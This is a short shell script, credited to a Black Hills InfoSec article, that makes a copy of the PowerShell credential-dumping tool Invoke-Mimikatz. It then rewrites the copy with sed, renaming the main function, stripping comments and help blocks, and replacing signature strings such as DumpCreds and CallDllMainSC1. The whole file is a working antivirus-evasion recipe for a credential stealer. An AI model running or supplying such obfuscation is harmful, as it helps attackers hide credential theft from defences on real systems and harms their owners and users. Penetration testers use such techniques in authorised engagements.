#!/bin/sh

# orig: https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/

cp Invoke-Mimikatz.orig.ps1 Invoke-Mimikatz.ps1 

sed -i -e 's/Invoke-Mimikatz/Invoke-Nao/g' Invoke-Mimikatz.ps1
sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1

sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1

sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1

sed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-Mimikatz.ps1

sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' Invoke-Mimikatz.ps1

sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions\$Win32Functions #\-/g" Invoke-Mimikatz.ps1
